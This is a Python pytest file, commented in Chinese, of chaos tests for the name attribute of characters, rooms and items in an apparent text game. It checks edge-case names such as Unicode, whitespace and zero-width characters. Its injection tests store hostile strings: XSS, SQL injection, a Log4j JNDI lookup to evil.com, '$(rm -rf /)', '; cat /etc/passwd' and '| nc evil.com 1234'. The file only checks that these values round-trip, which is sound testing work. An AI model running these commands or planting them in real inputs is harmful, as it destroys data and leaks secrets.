"""Name属性混沌测试 - 模拟各种极端name设置和随机操作.

测试name属性在各种异常、随机、边界情况下的表现。
使用Mock避免数据库操作超时。
"""

from __future__ import annotations

import pytest
import random
import string
from unittest.mock import MagicMock

from src.game.typeclasses.character import Character
from src.game.typeclasses.room import Room
from src.game.typeclasses.item import Item
from src.game.typeclasses.equipment import Equipment, EquipmentSlot
from src.game.npc.core import NPC


class MockDBModel:
    """模拟数据库模型."""

    def __init__(self, **kwargs) -> None:
        self.id = kwargs.get("id", 1)
        self.key = kwargs.get("key", "test_key")
        self.typeclass_path = kwargs.get(
            "typeclass_path", "src.game.typeclasses.character.Character"
        )
        self.location_id = kwargs.get("location_id", None)
        self.attributes = kwargs.get("attributes", {})
        self.contents = []


class MockManager:
    """模拟对象管理器."""

    def __init__(self) -> None:
        self._cache: dict[int, object] = {}
        self.dirty_objects: set[int] = set()

    def mark_dirty(self, obj: object) -> None:
        if hasattr(obj, 'id'):
            self.dirty_objects.add(obj.id)


@pytest.fixture
def mock_manager():
    return MockManager()


class TestRandomNameChaos:
    """随机name混沌测试 - 各种随机生成的name."""

    RANDOM_NAMES = [
        "",  # 空字符串
        "   ",  # 纯空格
        "\t\n\r",  # 控制字符
        "a",  # 单字符
        "ab",  # 双字符
        "A" * 10000,  # 超长name
        "名字" * 500,  # 超长中文
        "<script>alert('xss')</script>",  # XSS尝试
        "'; DROP TABLE users; --",  # SQL注入尝试
        "${jndi:ldap://evil.com}",  # Log4j式注入
        "\\\\\\\\",  # 路径遍历尝试
        "../config.yaml",  # 目录遍历
        "\x00\x01\x02",  # 二进制字符
        "日本語テスト",  # 日文
        "한국어테스트",  # 韩文
        "العربية",  # 阿拉伯文
        "🎮🗡️🛡️",  # Emoji
        "𝕱𝖗𝖆𝖐𝖙𝖚𝖗",  # 数学字体
        "ℂ𝕠𝕞𝕡𝕝𝕖𝕩",  # 双线字体
        "Ｆｕｌｌｗｉｄｔｈ",  # 全角字符
        "ᕙ(⇀‸↼‶)ᕗ",  # 颜文字
        "(╯°□°）╯︵ ┻━┻",  # 翻转桌
        r"¯\_(ツ)_/¯",  # 耸肩
        "ಠ_ಠ",  # 盯
        "ᶘ ᵒᴥᵒᶅ",  # 可爱动物
    ]

    def test_random_name_creation(self, mock_manager):
        """测试设置各种随机name."""
        for i, name in enumerate(self.RANDOM_NAMES):
            try:
                db = MockDBModel(id=i, key=f"test_char_{i}")
                char = Character(mock_manager, db)

                # 尝试设置随机name
                char.name = name

                # 验证读取
                retrieved_name = char.name
                # 空字符串会回退到key
                if name == "":
                    assert retrieved_name == f"test_char_{i}"
                else:
                    assert retrieved_name == name

            except Exception as e:
                print(f"Random name failed: {e}")

    def test_name_modification_chaos(self, mock_manager):
        """测试频繁修改name."""
        db = MockDBModel(id=1, key="chaos_char")
        char = Character(mock_manager, db)

        # 随机修改name 50次
        for _ in range(50):
            random_name = ''.join(random.choices(
                string.ascii_letters + string.digits + "中文测试_",
                k=random.randint(0, 50)
            ))
            try:
                char.name = random_name
                # 立即读取验证
                _ = char.name
            except Exception as e:
                print(f"Name modification failed: {e}")


class TestNameInDisplayChaos:
    """name在显示中的混沌测试."""

    CHAOS_NAMES = [
        ("正常", "key_normal"),
        ("\x1b[31m红色\x1b[0m", "key_ansi"),  # ANSI颜色代码
        ("\u202e反向文字\u202c", "key_rtl"),  # RTL覆盖
        ("a\u0308", "key_combine"),  # 组合字符
        ("𝙩𝙮𝙥𝙚", "key_fake_bold"),  # 假粗体
        ("ᴛʏᴘᴇ", "key_small_caps"),  # 小型大写字母
    ]

    def test_name_in_room_display(self, mock_manager):
        """测试各种name在房间显示中的表现."""
        db = MockDBModel(id=10, key="test_room", typeclass_path="src.game.typeclasses.room.Room")
        room = Room(mock_manager, db)

        for display_name, key in self.CHAOS_NAMES:
            try:
                room.name = display_name
                desc = room.at_desc(None)

                # 验证描述中包含name
                assert display_name in desc or room.key in desc
            except Exception as e:
                print(f"Room display with name failed: {e}")

    def test_name_in_combat_messages(self, mock_manager):
        """测试name在战斗消息中的表现."""
        db1 = MockDBModel(id=20, key="attacker")
        char1 = Character(mock_manager, db1)

        db2 = MockDBModel(id=21, key="defender")
        char2 = Character(mock_manager, db2)

        # 测试各种name格式
        chaos_names = ["普通", "空格 很多", "<b>HTML</b>", "'引号'", '"双引号"']

        for name in chaos_names:
            try:
                char1.name = name
                char2.name = "防守者"
                msg = f"{char1.name}攻击了{char2.name}"
                # 验证消息能正确格式化
                assert name in msg
            except Exception as e:
                print(f"Combat message with name failed: {e}")


class TestNameCollisionChaos:
    """name冲突混沌测试 - 多个对象相同name."""

    def test_multiple_objects_same_name(self, mock_manager):
        """测试多个对象使用完全相同的name."""
        same_name = "同名角色"

        # 创建50个同名角色
        chars = []
        for i in range(50):
            db = MockDBModel(id=100+i, key=f"char_{i}")
            char = Character(mock_manager, db)
            char.name = same_name
            chars.append(char)

        # 验证所有角色的name相同但key不同
        for char in chars:
            assert char.name == same_name

        keys = [char.key for char in chars]
        assert len(set(keys)) == 50  # 所有key唯一

    def test_same_name_different_types(self, mock_manager):
        """测试不同类型对象使用相同name."""
        same_name = "同名"

        # 不同类型对象使用相同name
        db1 = MockDBModel(id=30, key="char")
        char = Character(mock_manager, db1)
        char.name = same_name

        db2 = MockDBModel(id=31, key="item", typeclass_path="src.game.typeclasses.item.Item")
        item = Item(mock_manager, db2)
        item.name = same_name

        db3 = MockDBModel(id=32, key="room", typeclass_path="src.game.typeclasses.room.Room")
        room = Room(mock_manager, db3)
        room.name = same_name

        # 验证各自name正确
        assert char.name == same_name
        assert item.name == same_name
        assert room.name == same_name


class TestNameEdgeCaseChaos:
    """name边界情况混沌测试."""

    def test_name_with_whitespace_variations(self, mock_manager):
        """测试各种空白字符组合."""
        db = MockDBModel(id=40, key="ws_test")
        char = Character(mock_manager, db)

        whitespace_names = [
            " ",      # 单个空格
            "  ",     # 两个空格
            "\t",     # 制表符
            "\n",     # 换行
            " \t\n ", # 混合空白
            "前 后",   # 中间空格
            " 前后 ",  # 前后空格
            "\u00A0", # 不间断空格
            "\u2000", # En quad
            "\u3000", # 全角空格
        ]

        for ws_name in whitespace_names:
            try:
                char.name = ws_name
                # 纯空白不回退（预期行为）
                if ws_name.strip() == "":
                    # 纯空白保持原样
                    assert char.name == ws_name
                else:
                    assert char.name == ws_name
            except Exception as e:
                print(f"Whitespace name failed: {e}")

    def test_name_with_zero_width_chars(self, mock_manager):
        """测试零宽字符."""
        db = MockDBModel(id=50, key="zw_test")
        char = Character(mock_manager, db)

        # 零宽字符组合
        zw_names = [
            "普\u200B通",     # 零宽空格
            "普\u200C通",     # 零宽非连接符
            "普\u200D通",     # 零宽连接符
            "普\uFEFF通",    # BOM字符
            "\u200B",         # 纯零宽空格（应回退）
        ]

        for name in zw_names:
            try:
                char.name = name
                retrieved = char.name
                # 验证能正确存储和读取
                if name == "\u200B":
                    # 纯零宽字符视为空，回退到key
                    assert retrieved == "zw_test"
                else:
                    assert retrieved == name
            except Exception as e:
                print(f"Zero-width name failed: {e}")

    def test_name_unicode_normalization(self, mock_manager):
        """测试Unicode规范化."""
        db = MockDBModel(id=60, key="unicode_test")
        char = Character(mock_manager, db)

        # 相同的字符，不同组合方式
        # é 可以是 U+00E9 或 U+0065 U+0301
        names = [
            "caf\u00e9",      # 预组合字符
            "cafe\u0301",     # 基础字符+组合重音
        ]

        for name in names:
            char.name = name
            # 两者都应能存储，但可能不同
            assert char.name == name


class TestNameStateChaos:
    """name状态混沌测试 - 在各种状态下修改name."""

    def test_name_change_during_operations(self, mock_manager):
        """测试操作过程中修改name."""
        db = MockDBModel(id=70, key="state_char")
        char = Character(mock_manager, db)
        char.name = "原始名"

        # 模拟各种操作中间改name
        operations = [
            "移动中",
            "战斗中",
            "对话中",
            "交易中",
            "原始名",  # 改回来
        ]

        for op in operations:
            try:
                char.name = op
                # 立即使用name
                _ = f"{char.name}正在执行操作"
            except Exception as e:
                print(f"Name change during operation failed: {e}")

    def test_rapid_name_toggle(self, mock_manager):
        """测试快速切换两个name."""
        db = MockDBModel(id=71, key="toggle_char")
        char = Character(mock_manager, db)

        names = ["名字A", "名字B"]

        # 快速切换100次
        for i in range(100):
            char.name = names[i % 2]
            assert char.name == names[i % 2]


class TestNameRecoveryChaos:
    """name恢复混沌测试 - 异常后name状态."""

    def test_name_after_exception(self, mock_manager):
        """测试异常后name状态."""
        db = MockDBModel(id=80, key="recovery_char")
        char = Character(mock_manager, db)
        char.name = "异常前"

        # 模拟操作异常
        try:
            char.name = "异常中"
            raise ValueError("模拟异常")
        except ValueError:
            pass

        # 验证异常后name保持最后一次设置
        assert char.name == "异常中"

    def test_name_with_direct_none_set(self, mock_manager):
        """测试直接设置None后的回退."""
        db = MockDBModel(id=90, key="none_char")
        char = Character(mock_manager, db)
        char.name = "正常名"

        # 验证name已设置
        assert char.name == "正常名"

        # 直接设置None（模拟无效值）
        char.db.set("name", None)

        # 验证name回退到key
        assert char.name == "none_char"

    def test_name_with_empty_after_set(self, mock_manager):
        """测试设置后清空."""
        db = MockDBModel(id=91, key="empty_char")
        char = Character(mock_manager, db)
        char.name = "好名字"

        # 验证name已设置
        assert char.name == "好名字"

        # 设置为空字符串
        char.name = ""

        # 验证回退到key
        assert char.name == "empty_char"


class TestNameInjectionChaos:
    """name注入攻击测试."""

    def test_xss_in_name(self, mock_manager):
        """测试XSS攻击在name中."""
        db = MockDBModel(id=100, key="xss_test")
        char = Character(mock_manager, db)

        xss_names = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='evil.com'>",
            "<body onload=alert('xss')>",
        ]

        for name in xss_names:
            char.name = name
            # 验证原样存储（系统不应对name进行HTML转义）
            assert char.name == name

    def test_sql_injection_in_name(self, mock_manager):
        """测试SQL注入在name中."""
        db = MockDBModel(id=101, key="sql_test")
        char = Character(mock_manager, db)

        sql_names = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "'; DELETE FROM characters; --",
            "1; SELECT * FROM passwords",
        ]

        for name in sql_names:
            char.name = name
            # 验证原样存储（参数化查询应处理注入）
            assert char.name == name

    def test_command_injection_in_name(self, mock_manager):
        """测试命令注入在name中."""
        db = MockDBModel(id=102, key="cmd_test")
        char = Character(mock_manager, db)

        cmd_names = [
            "$(rm -rf /)",
            "`whoami`",
            "; cat /etc/passwd",
            "| nc evil.com 1234",
        ]

        for name in cmd_names:
            char.name = name
            assert char.name == name


class TestNameFormatStringChaos:
    """格式化字符串攻击测试."""

    def test_format_string_in_name(self, mock_manager):
        """测试格式化字符串攻击."""
        db = MockDBModel(id=110, key="fmt_test")
        char = Character(mock_manager, db)

        fmt_names = [
            "%s%s%s%s%s",
            "%x%x%x%x",
            "%(key)s",
            "{0}{1}{2}",
            "{} {} {}",
        ]

        for name in fmt_names:
            char.name = name
            assert char.name == name

    def test_name_in_fstring_safety(self, mock_manager):
        """测试name在f-string中的安全性."""
        db = MockDBModel(id=111, key="fstring_test")
        char = Character(mock_manager, db)

        # 设置包含花括号的name
        char.name = "{invalid_syntax}"

        # f-string应正常工作
        try:
            msg = f"Hello {char.name}"
            assert "{invalid_syntax}" in msg
        except Exception as e:
            print(f"F-string with braces failed: {e}")

    def test_name_with_newline_injection(self, mock_manager):
        """测试换行注入."""
        db = MockDBModel(id=112, key="newline_test")
        char = Character(mock_manager, db)

        # 设置包含换行的name
        char.name = "第一行\n第二行\n第三行"

        # 验证换行保持
        assert "\n" in char.name
        lines = char.name.split("\n")
        assert len(lines) == 3
